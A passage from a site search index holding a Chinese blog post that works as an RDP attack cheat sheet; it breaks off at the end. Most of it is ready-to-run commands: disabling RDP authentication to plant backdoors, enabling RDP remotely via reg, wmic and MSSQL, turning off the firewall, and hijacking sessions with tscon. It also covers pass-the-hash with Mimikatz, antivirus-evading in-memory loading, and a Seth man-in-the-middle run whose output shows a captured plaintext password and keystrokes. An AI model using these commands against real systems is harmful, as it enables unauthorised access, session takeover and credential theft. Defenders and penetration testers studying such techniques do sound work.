<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>RDP安全总结</title>
      <link href="posts/24991.html"/>
      <url>posts/24991.html</url>
      
        <content type="html"><![CDATA[<h1 id="一、RDP-介绍"><a href="#一、RDP-介绍" class="headerlink" title="一、RDP 介绍"></a>一、RDP 介绍</h1><hr><blockquote><p>RDP，Remote Desktop Protocol，远程桌面协议，该协议是对国际电信联盟发布的一个国际标准的多通道会议协议 T.120 的一个扩展。远程桌面协议让用户（客户端或称 “本地电脑”）连上提供微软终端机服务的电脑（服务器端或称 “远程电脑”）。大部分的 Windows、Linux、FreeBSD、Mac OS X 都有相应的客户端。远程桌面协议在服务端默认监听 TCP 3389 端口的数据。远程桌面协议为用户提供了通过网络连接远程登录到另一台计算机的图形界面。</p></blockquote><h2 id="userauthentication鉴权"><a href="#userauthentication鉴权" class="headerlink" title="userauthentication鉴权"></a>userauthentication鉴权</h2><p>那我们在实战中，需要了解另一个权限，userauthentication 权限 ，该权限主要是用于设置远程连接的身份验证，称之为鉴权</p><p>详情见：<a href="https://docs.microsoft.com/zh-cn/windows-hardware/customize/desktop/unattend/microsoft-windows-terminalservices-rdp-winstationextensions-userauthentication">UserAuthentication | Microsoft Docs</a></p><pre class="line-numbers language-none"><code class="language-none">0   指定的网络级用户不需要身份验证就能建立远程桌面连接。 这是默认值。1   指定网络级别的用户身份验证是必需的<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>我们采用如下命令来开启或者关闭鉴权，这里 0 代表关闭，1 代表开启：</p><pre class="line-numbers language-none"><code class="language-none">REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>关于网络级身份验证(NLA)</strong></p><p>所谓网络级验证（network level authentication NLA）是提供给远程桌面连接的一种新安全验证机制，可以在终端桌面连接及<strong>登录画面出现前</strong>预先完成用户验证程序，由于提前验证部分仅需要使用到较少的网络资源，因此可以有效防范黑客与恶意程序的攻击，同时降低阻断服务攻击(Dos)的机会。</p><p>网络级身份验证有以下优点：</p><ul><li>开始时它只需要很少的远程计算机资源，因为在验证用户身份之前，远程计算机只使用有限的资源，密码验证通过后才进入远程桌面。在早期版本中，远程计算机会启动完全的远程桌面连接。</li><li>它可以通过降低拒绝服务攻击（拒绝服务攻击试图限制或阻止访问 Internet）的风险来帮助提高安全性。</li><li>它采用远程计算机身份验证。这有助于防止用户连接到出于恶意目的而建立的远程计算机。</li></ul><h2 id="securitylayer-安全层验证"><a href="#securitylayer-安全层验证" class="headerlink" title="securitylayer 安全层验证"></a>securitylayer 安全层验证</h2><blockquote><p>securitylayer 指定服务器和客户端如何彼此进行身份验证之前建立的远程桌面连接。这个安全层验证简单来说就是保证了对话传输保密性更高，它的默认值为 1，指定在建立远程桌面连接之前，服务器和客户端需要进行身份验证，如果这个地方安全层验证的默认值为 1，服务器和客户端就必须要进行身份验证，也就是输入帐号密码的操作。</p></blockquote><p>详情见：<a href="https://docs.microsoft.com/zh-cn/windows-hardware/customize/desktop/unattend/microsoft-windows-terminalservices-rdp-winstationextensions-securitylayer">SecurityLayer | Microsoft Docs</a></p><pre class="line-numbers language-none"><code class="language-none">0 就是连接前使用 rdp 协议进行身份验证，rdp 即远程桌面连接，可以简单理解为就是关闭验证。1 是指在连接前两端协商来进行身份验证，这个是默认值。2 就是使用 tls 协议来进行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>使用如下命令来进行修改</p><pre class="line-numbers language-none"><code class="language-none">REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="出现身份验证错误-报错解决"><a href="#出现身份验证错误-报错解决" class="headerlink" title="出现身份验证错误 报错解决"></a>出现身份验证错误 报错解决</h2><pre class="line-numbers language-none"><code class="language-none">出现身份验证错误，要求的函数不受支持，远程计算机：X.X.X.X，这可能是由于CredSSP加密Oracle修正<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>方法一</strong></p><p>这就需要<strong>被连接端</strong>关闭鉴权模式，在<strong>被连接端</strong>使用上述reg命令关闭鉴权</p><p>或者在远程桌面连接设置里面，取消 “仅允许运行使用网络级别身份验证的远程桌面的计算机连接” 这一安全设置，  </p><p>选择运行任意版本远程桌面的计算机连接即可。  </p><p><strong>方法二</strong></p><p>在<strong>控制端</strong>, win+r，输入regedit，点击确定，打开注册表编辑器；<br>找到路径：</p><p>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters</p><p>后两项没有时手动建立，右键左侧目录System，选择“新建——项”，输入文件夹名</p><p>在Parameters 里 新建 DWORD（32位），名称：“AllowEncryptionOracle”，值：2</p><p>再次连接远程计算机，失败则重启。</p><h2 id="进入远程桌面登录用户"><a href="#进入远程桌面登录用户" class="headerlink" title="进入远程桌面登录用户"></a>进入远程桌面登录用户</h2><p>我在测试过程中，需要同时关闭 <code>userauthentication</code> 和 <code>securitylayer </code></p><p>才可以不用输入凭证 进入 3389 的登录页面 来登录远程桌面。</p><p>可以用来留shift后门之类的。</p><h1 id="二、查询3389端口方式"><a href="#二、查询3389端口方式" class="headerlink" title="二、查询3389端口方式"></a>二、查询3389端口方式</h1><p><a href="https://mp.weixin.qq.com/s/hgGcoEghsW0IIh7r-YCKCg">查询和开启3389端口方式总结</a></p><h2 id="1-REG查询3389状态（0：ON、1：OFF）"><a href="#1-REG查询3389状态（0：ON、1：OFF）" class="headerlink" title="(1) REG查询3389状态（0：ON、1：OFF）"></a>(1) REG查询3389状态（0：ON、1：OFF）</h2><pre class="line-numbers language-none"><code class="language-none">REG query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-REG查询3389端口（16进制-gt-10进制）"><a href="#2-REG查询3389端口（16进制-gt-10进制）" class="headerlink" title="(2) REG查询3389端口（16进制->10进制）"></a>(2) REG查询3389端口（16进制-&gt;10进制）</h2><pre class="line-numbers language-none"><code class="language-none">REG query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds" /sREG query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumberset /a Port=0xd3d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="3-tasklist、netstat命令查询3389端口"><a href="#3-tasklist、netstat命令查询3389端口" class="headerlink" title="(3) tasklist、netstat命令查询3389端口"></a>(3) tasklist、netstat命令查询3389端口</h2><pre class="line-numbers language-none"><code class="language-none">tasklist /svc | findstr "TermService"netstat -ano | findstr "2028"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>注：有时也会遇到特殊情况，如某虚拟主机自建低权限用户运行的IIS（Users、IIS_IUSRS），tasklist /svc不显示服务名，注册表查看是0xd3d，但netstat -ano里又没有3389端口，这可能是因为3389远程终端被关闭了，Users权限下只能根据个人经验盲猜可疑端口号。</p></blockquote><h2 id="4-Meterpreter的netstat查询3389端口"><a href="#4-Meterpreter的netstat查询3389端口" class="headerlink" title="(4) Meterpreter的netstat查询3389端口"></a>(4) Meterpreter的netstat查询3389端口</h2><p>有时我们会遇到不能执行netstat、tasklist和reg等命令的情况，<br>这时可以通过Meterpreter下的netstat命令来快速查询3389端口，先找0.0.0.0运行的svchost.exe，然后根据个人经验盲猜可疑端口号。  </p><h2 id="5-端口扫描"><a href="#5-端口扫描" class="headerlink" title="(5) 端口扫描"></a>(5) 端口扫描</h2><p>可以借助 Nmap 扫描来验证端口 3389 是否被打开</p><pre class="line-numbers language-none"><code class="language-none">nmap -sV -sC -p 3389 192.168.93.30<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="三、开启3389端口方式"><a href="#三、开启3389端口方式" class="headerlink" title="三、开启3389端口方式"></a>三、开启3389端口方式</h1><h2 id="1-MSF命令开启3389端口"><a href="#1-MSF命令开启3389端口" class="headerlink" title="(1) MSF命令开启3389端口"></a>(1) MSF命令开启3389端口</h2><p>支持系统：<br>XP/Win2k3/Win7/Win2k8/Win8.1/Win10/2012/2016</p><pre class="line-numbers language-none"><code class="language-none">meterpreter &gt; run post/windows/manage/enable_rdpmeterpreter &gt; run getgui -e<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>注：getgui可用于开启目标机器的3389远程桌面端口、创建管理员账户密码、禁用远程桌面(TCP-In)防火墙入站规则等。</p></blockquote><h2 id="2-REG命令开启3389端口"><a href="#2-REG命令开启3389端口" class="headerlink" title="(2) REG命令开启3389端口"></a>(2) REG命令开启3389端口</h2><p>支持系统：<br>XP/Win2k3/Win7/Win2k8/Win8.1/Win10/2012/2016（0：ON、1：OFF）</p><pre class="line-numbers language-none"><code class="language-none">// 开启远程桌面REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f// 修改windows远程桌面端口3389为3000(一般情况不要改)REG ADD "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v "PortNumber" /t REG_DWORD /d 3000 /f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-WMIC命令开启3389端口"><a href="#3-WMIC命令开启3389端口" class="headerlink" title="(3) WMIC命令开启3389端口"></a>(3) WMIC命令开启3389端口</h2><p>支持系统：<br>Win2k3/Win7/Win2k8/Win8.1/Win10/2012/2016（1：ON、0：OFF）</p><pre class="line-numbers language-none"><code class="language-none">wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1# 前提条件是确保“Windows Management Instrumentation（Winmgmt）”服务已正常启动。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="4-WMIC开启远程主机3389端口"><a href="#4-WMIC开启远程主机3389端口" class="headerlink" title="(4) WMIC开启远程主机3389端口"></a>(4) WMIC开启远程主机3389端口</h2><p>支持系统：<br>Win2k/XP/Win2k3</p><pre class="line-numbers language-none"><code class="language-none">// wmic /node:"[full machine name]" /USER:"[domain]\[username]" PATH win32_terminalservicesetting WHERE (__Class!="") CALL SetAllowTSConnections 1wmic /node:192.168.0.103 /user:administrator /password:betasec PATH win32_terminalservicesetting WHERE (__Class!="") CALL SetAllowTSConnections 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>支持系统：<br>Win7/Win2k8/Win8.1/Win10/2012/2016</p><pre class="line-numbers language-none"><code class="language-none">wmic /node:192.168.0.116 /user:administrator /password:betasec RDTOGGLE WHERE ServerName='WIN-TO2CN3V2VPR' call SetAllowTSConnections 1wmic /node:192.168.0.116 /user:administrator /password:betasec process call create 'cmd.exe /c REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>注意事项：<br>其实就是利用WMIC远程执行命令的方式来执行WMIC、REG等开启3389端口的命令。<br>WMIC远程开启3389端口时不能用%COMPUTERNAME%环境变量替代远程主机的计算机名。<br>错误：描述 = 拒绝访问，这是因为开启了UAC用户账户控制，只允许RID500管理员执行此操作。</p></blockquote><h2 id="5-Windows-API开启3389端口"><a href="#5-Windows-API开启3389端口" class="headerlink" title="(5) Windows API开启3389端口"></a>(5) Windows API开启3389端口</h2><p>冷逸老哥用C++写的“开3389工具”有点小问题，在两台Windows2008机器上测试时分别报出缺少vcruntime140.dll、api-ms-win-crt-runtime-l1-1-0.dll，可以自己去调试编译下。</p><p>根据@冷逸老哥的思路用C#也写了一个，目标框架：.NET Framework 2.0，可用CobaltStrike execute-assembly加载到内存中实现无落地执行，<br>其工具原理就是利用RegCreateKeyEx和RegSetValueEx两个API和Microsoft.Win32 RegistryKey类操作系统注册表，与无Net.exe添加管理员用户一样，都是直接利用Windows API执行相应操作！！！</p><p><a href="https://github.com/3had0w/Open3389">https://github.com/3had0w/Open3389</a></p><p>应用场景-1：<br>目标主机因存在某安全防护软件而无法用reg、wmic命令开启3389端口时，可以尝试使用这款工具来查询和开启3389端口，可用execute-assembly加载到内存中执行。</p><p>应用场景-2：<br>目标主机因存在某安全防护软件（如：某锁、某安全卫士）在拦截rundll32.exe时则不能用execute-assembly加载到内存中执行，所以只能选择落地执行，目前为止还是免杀的。</p><h2 id="6-MSSQL-xp-regwrite开启3389端口"><a href="#6-MSSQL-xp-regwrite开启3389端口" class="headerlink" title="(6) MSSQL xp_regwrite开启3389端口"></a>(6) MSSQL xp_regwrite开启3389端口</h2><p>应用场景：xp_cmdshell被禁用/删除且无法恢复时，可尝试用xp_regread、xp_regwrite来查询和开启目标机器3389端口，也可以选择用sp_OACreate、Agent Job等其他命令执行方式。</p><pre class="line-numbers language-none"><code class="language-none"># 1、查询3389开启状态exec master.dbo.xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server' ,'fDenyTSConnections'# 2、查询3389远程桌面端口exec master.dbo.xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp','PortNumber' # 3、开启3389远程桌面端口（0：ON、1：OFF）exec master.dbo.xp_regwrite 'HKEY_LOCAL_MACHINE','SYSTEM\CurrentControlSet\Control\Terminal Server','fDenyTSConnections','REG_DWORD',0;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="四、防火墙配置"><a href="#四、防火墙配置" class="headerlink" title="四、防火墙配置"></a>四、防火墙配置</h1><pre class="line-numbers language-none"><code class="language-none">// 配置一下防火墙，设置为允许远程桌面连接，命令：netsh advfirewall firewall add rule name="Remote Desktop" protocol=TCP dir=in localport=3389 action=allow// netsh 是 windows 的网络配置命令，advfirewall firewall 意思为防火墙的高级设置，add rule 是添加一条规则// name 指定规则名称，protocol 指定协议，dir 指定是出站还是入站，localport 指定端口，action 指定动作 allow 允许// 关闭防火墙netsh firewall set opmode mode=disable<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="五、RDP连接工具"><a href="#五、RDP连接工具" class="headerlink" title="五、RDP连接工具"></a>五、RDP连接工具</h1><p>开启目标主机的远程桌面后，我们便可以对目标主机进行连接了：</p><ul><li><strong>Linux 系统上的可以使用 rdesktop：</strong></li></ul><pre class="line-numbers language-none"><code class="language-none">redesktop 192.168.93.30  # redesktop IP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><strong>Windows 系统上可以使用 mstsc.exe</strong></li></ul><h1 id="六、暴力破解RDP口令"><a href="#六、暴力破解RDP口令" class="headerlink" title="六、暴力破解RDP口令"></a>六、暴力破解RDP口令</h1><p>在实战中，攻击者可以借助 Nmap 来扫描目标主机 3389 端口是否开启，如果目标主机开启了 3389 端口，那我们便可以对目标主机的远程桌面登录口令进行暴力猜解。</p><p>可以使用超级弱口令检查工具和Hydra之类的工具</p><p>下载地址：<a href="https://github.com/shack2/SNETCracker/releases">shack2/SNETCracker</a></p><h1 id="七、RDP劫持"><a href="#七、RDP劫持" class="headerlink" title="七、RDP劫持"></a>七、RDP劫持</h1><p>在 Windows 中有一个 tscon 命令行下使用的工具</p><p>首先执行如下命令获取用户对应的会话 ID：</p><pre class="line-numbers language-none"><code class="language-none">query user<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到用户对应的会话 ID，然后通过执行 tscon 命令即可成功切换至目标用户的远程桌面</p><pre class="line-numbers language-none"><code class="language-none">tscon 会话id /PASSWORD:要切换的用户密码eg:tscon 2 /PASSWORD:Bunny2021<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>在 SYSTEM 权限下直接执行 tscon 会话切换命令， 不需要输入密码：</p><pre class="line-numbers language-none"><code class="language-none">tscon ID<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="高权限用户劫持低权限用户的-RDP"><a href="#高权限用户劫持低权限用户的-RDP" class="headerlink" title="高权限用户劫持低权限用户的 RDP"></a>高权限用户劫持低权限用户的 RDP</h3><p>高权限用户劫持低权限用户的 RDP 会话利用起来比较简单，由于具有管理员权限，可以直接通过创建服务等方式获取 SYSTEM 权限。</p><p>创建劫持用户会话的服务：</p><pre class="line-numbers language-none"><code class="language-none">sc create rdp binpath= "cmd.exe /k tscon 会话id /dest:会话名称"sc create rdp binpath= "cmd.exe /k tscon 1 /dest:rdp-tcp#4"      #修改为目标会话id和当前会话名sc start rdp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>执行<code>sc start rdp</code>后，我们创建的劫持会话的服务将会启动，</p><p>由于 Windows 是以 SYSTEM 权限运行服务的，所以我们<code>tscon 2</code>命令也会以 SYSTEM 权限运行，</p><p>此时便可以在不提供目标用户密码的情况下成功劫持目标用户的会话</p><h3 id="低权限用户劫持高权限用户的-RDP"><a href="#低权限用户劫持高权限用户的-RDP" class="headerlink" title="低权限用户劫持高权限用户的 RDP"></a>低权限用户劫持高权限用户的 RDP</h3><p>低权限用户想要劫持高权限用户的 RDP 的话需要想办法提权，即将自己的权限提升至 SYSTEM。</p><h1 id="八、哈希传递登录-RDP"><a href="#八、哈希传递登录-RDP" class="headerlink" title="八、哈希传递登录 RDP"></a>八、哈希传递登录 RDP</h1><p>Windows Server 2012 R2 采用了新版的 RDP 远程桌面协议，在这个新版协议中有一个 ” 受限管理员” （Restricted Admin）的特性。相信渗透测试人员和系统管理员都会对这个特性有足够的兴趣，因为通过这个特性，我们可以实现哈希传递攻击并成功登录远程桌面。</p><p>在抓取到的 Hash 无法破解的情况下，如果目标主机开启了 “Restricted Admin Mode” 也行，那么我们便可以使用 Hash 来直接实现 RDP 远程登录。Restricted Admin Mode 在 Windows 8.1 和 Windows Server 2012 R2 上默认开启。</p><p>我们在渗透过程中可以通过修改注册表的方式开启目标主机的 Restricted Admin Mode，值为 0 代表开启，值为 1 代表关闭：</p><pre class="line-numbers language-none"><code class="language-none">REG ADD "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f# 查看是否成功开启REG query "HKLM\System\CurrentControlSet\Control\Lsa" | findstr "DisableRestrictedAdmin"    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>然后再攻击机上使用 Mimikatz 进行哈希传递，大致原理就是哈希传递成功后执行<code>mstsc.exe /restrictedadmin</code>来打开：</p><pre class="line-numbers language-none"><code class="language-none">privilege::debugsekurlsa::pth /user:administrator /domain:whoamianony.org /ntlm:ab89b1295e69d353dd7614c7a3a80cec "/run:mstsc.exe /restrictedadmin"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>注意，这里的受限管理员模式顾名思义只对管理员组有效。所以如果你获取到的用户属于远程桌面用户组，那么是无法通过 Hash 登录的。</p></blockquote><h1 id="九、多用户登录"><a href="#九、多用户登录" class="headerlink" title="九、多用户登录"></a>九、多用户登录</h1><h2 id="多用户登陆同一个账户"><a href="#多用户登陆同一个账户" class="headerlink" title="多用户登陆同一个账户"></a>多用户登陆同一个账户</h2><p>环境：Windows server 2012<br>打开cmd，输入gpedit.msc 组策略，找到【计算机设置】–【管理模板】–【windows组件】–【远程桌面服务】–【远程桌面会话主机】–【连接】</p><p>按照以下步骤操作：<br>1、拒绝将已经登录到控制台会话的管理员注销—选择启用<br>2、限制连接的数量—选择启用，配置‘允许的RD最大连接数’为10个<br>3、将远程桌面服务用户限制到单独的远程桌面服务会话—选择禁用</p><p>打开管理员命令提示符运行</p><p><code>gpupdate /force </code></p><h2 id="多用户登录不同账户"><a href="#多用户登录不同账户" class="headerlink" title="多用户登录不同账户"></a>多用户登录不同账户</h2><p>详情见：<a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Windows%E7%B3%BB%E7%BB%9F%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E7%9A%84%E5%A4%9A%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95">渗透技巧——Windows系统远程桌面的多用户登录</a></p><p>非服务器版本的 Windows 系统默认只允许一个账户登录，远程登录时，</p><p>使用与原系统相同的账户，原系统将被切换到登录界面</p><p>使用不同的账户，登录时提示其他用户已登录到此计算机，</p><p>选择继续后，原系统桌面将弹框提示是否断开当前连接 (30 秒后默认选择同意，退回到登录界面)</p><h3 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h3><p>Mimikatz 开启多用户登录，支持Win 7 及以前的版本系统</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">mimikatz.exeprivilege::debugts::multirdp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>PS：使用与原系统相同的账户，原系统还是会被切换到登录界面；不同账户登陆成功</p></blockquote><h3 id="RDPwrap"><a href="#RDPwrap" class="headerlink" title="RDPwrap"></a>RDPwrap</h3><p>工程地址：<br><a href="https://github.com/stascorp/rdpwrap">https://github.com/stascorp/rdpwrap</a></p><p>工具地址：<br><a href="https://github.com/stascorp/rdpwrap/releases">https://github.com/stascorp/rdpwrap/releases</a></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">RDPwrap：支持Win Vista - Win10RDPWinst.exe -i is # 安装 RDPWinst.exe -u # 卸载RDPWinst.exe -i is # 安装 RDPWinst.exe -u # 卸载<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="SharpDoor"><a href="#SharpDoor" class="headerlink" title="SharpDoor"></a>SharpDoor</h3><p>仅使用于Win 10 开启多会话RDP</p><h1 id="十、RDP中间人攻击"><a href="#十、RDP中间人攻击" class="headerlink" title="十、RDP中间人攻击"></a>十、RDP中间人攻击</h1><p>中间人攻击通常会导致凭据捕获。同样的，在对 RDP 会话进行中间人攻击，攻击者可以获得一个登录用户的明文密码，用于后期的横向移动。当 RDP 爆破走不通时，我们不妨尝试一下中间人。</p><p>Seth 是一个用 Python 和 Bash 编写的 RDP 中间人攻击自动化工具，通过尝试降级连接用以提取明文凭证来实现 MitM RDP 连接，而不管网络级别的身份验证（NLA）是否启用。</p><p>项目地址：<a href="https://github.com/SySS-Research/Seth">https://github.com/SySS-Research/Seth</a></p><p>使用该工具所要求的环境：  </p><ul><li>Python 3</li><li>Tcpdump</li><li>Arpspoof</li><li>Openssl</li></ul><p>使用方法如下：</p><pre class="line-numbers language-none"><code class="language-none">./seth.sh &lt;INTERFACE&gt; &lt;ATTACKER_IP&gt; &lt;VICTIM_IP&gt; &lt;GATEWAY_IP|HOST_IP&gt; [&lt;COMMAND&gt;]INTERFACE：网卡ATTACKER IP：中间人 IPVICTIM IP：连接者 IPGATEWAY IP|HOST IP：被连接的远程主机 IPCOMMAND：启动时执行的命令执行以下命令启动 seth 监听：./seth.sh eth0 192.168.93.128 192.168.93.20 192.168.93.30<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后当 PC 上的用户远程登录 DC 时便会抓取到登录用户的明文密码。不仅如此，还可以对用户键盘的操作进行记录，甚至使用<code>&lt;COMMAND&gt;</code>在目标主机上执行命令。</p><p>详情请看：<a href="https://www.freebuf.com/sectool/178146.html">https://www.freebuf.com/sectool/178146.html</a></p><p>攻击成功后类似如下：</p><pre class="line-numbers language-none"><code class="language-none"># ./seth.sh eth0 192.168.93.128 192.168.93.20 192.168.93.30███████╗███████╗████████╗██╗  ██╗██╔════╝██╔════╝╚══██╔══╝██║  ██║   by Adrian Vollmer███████╗█████╗     ██║   ███████║   seth@vollmer.syss.de╚════██║██╔══╝     ██║   ██╔══██║   SySS GmbH, 2017███████║███████╗   ██║   ██║  ██║   https://www.syss.de╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝[*] SpoofinG arp replies...[*] TurninG on IP forwardinG...[*] Set iptables rules for SYN packets...[*] WaitinG for a SYN packet to the oriGinal destination...[+] Got it! OriGinal destination is 192.168.93.30[*] Clone the x509 certificate of the oriGinal destination...[*] Adjust the iptables rule for all packets...[*] Run RDP proxy...ListeninG for new connectionConnection received from 192.168.93.20:50431DownGradinG authentication options from 11 to 3Enable SSLalice::avollmer-syss:1f20645749b0dfd5:b0d3d5f1642c05764ca28450f89d38db:0101000000000000b2720f48f5ded2012692fcdbf5c79a690000000002001e004400450053004b0054004f0050002d0056004e0056004d0035004f004e0001001e004400450053004b0054004f0050002d0056004e0056004d0035004f004e0004001e004400450053004b0054004f0050002d0056004e0056004d0035004f004e0003001e004400450053004b0054004f0050002d0056004e0056004d0035004f004e0007000800b2720f48f5ded20106000400020000000800300030000000000000000100000000200000413a2721a0d955c51a52d647289621706d6980bf83a5474c10d3ac02acb0105c0a0010000000000000000000000000000000000009002c005400450052004d005300520056002f003100390032002e003100360038002e00350037002e00310030003200000000000000000000000000Tamper with NTLM responseTLS alert access denied, DownGradinG CredSSPConnection lostConnection received from 192.168.57.103:50409ListeninG for new connectionEnable SSLConnection lostConnection received from 192.168.57.103:50410ListeninG for new connectionEnable SSLHidinG forGed protocol request from client.\alice:ilovebobKeyboard Layout: 0x409 (EnGlish_United_States)Key press:   LShiftKey press:   SKey release:                 SKey release:                 LShiftKey press:   EKey release:                 EKey press:   CKey release:                 CKey press:   RKey release:                 RKey press:   EKey release:                 EKey press:   TKey release:                 TConnection lost[*] CleaninG up...[*] Done.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="十一、获取RDP远程桌面连接记录"><a href="#十一、获取RDP远程桌面连接记录" class="headerlink" title="十一、获取RDP远程桌面连接记录"></a>十一、获取RDP远程桌面连接记录</h1><p>在渗透测试中，远程桌面连接的历史记录不可忽视，根据历史记录往往能定位出关键的服务器。接下来我们就介绍一下如何导出 RDP 连接的历史记录。</p><p>获取 RDP 远程桌面连接记录可以通过枚举注册表完成，但是如果想要获得所有用户的历史记录，需要逐个获得用户的 NTUSER.DAT 文件，通过注册表加载配置单元，导入用户配置信息，再进行枚举才能够实现。</p><p>详情见：<a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E8%8E%B7%E5%BE%97Windows%E7%B3%BB%E7%BB%9F%E7%9A%84%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95">渗透技巧——获得Windows系统的远程桌面连接历史记录</a></p><h2 id="导出当前用户的历史记录"><a href="#导出当前用户的历史记录" class="headerlink" title="导出当前用户的历史记录"></a>导出当前用户的历史记录</h2><p>可以通过枚举下面的注册表键值查看当前用户的历史记录：</p><pre class="line-numbers language-none"><code class="language-none">HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也可以通过 PowerShell 命令行来实现，首先通过以下命令枚举指定注册表项下所有的的子项，即当前用户所连接过的所有的主机名：</p><pre class="line-numbers language-none"><code class="language-none">dir "Registry::HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers" -Name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后使用以下命令查询指定注册表项的注册表键值，即查看连接所使用的用户名：</p><pre class="line-numbers language-none"><code class="language-none">(Get-ItemProperty -Path "Registry::HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers\192.168.93.30").UsernameHint<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下面给出一个三好学生写的枚举脚本：</p><pre class="line-numbers language-none"><code class="language-none">$RegPath = "Registry::HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers\"$QueryPath = dir $RegPath -Nameforeach($Name in $QueryPath){       Try      {          $User = (Get-ItemProperty -Path $RegPath$Name -ErrorAction Stop | Out-Null).UsernameHint            Write-Host "Server:"$Name            Write-Host "User:"$User"`n"        }        Catch          {        Write-Host "No RDP Connections History"        }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="导出已登录用户的历史记录"><a href="#导出已登录用户的历史记录" class="headerlink" title="导出已登录用户的历史记录"></a>导出已登录用户的历史记录</h2><p>已登录用户的注册表信息会同步保存在<code>HKEY_USERS\&lt;SID&gt;</code>目录下，<code>&lt;SID&gt;</code>要对应每个用户的 SID：</p><p>几个用户，分别有几个子项。我们可以通过枚举注册表键值</p><p><code>HKEY_USERS\SID\Software\Microsoft\Terminal Server 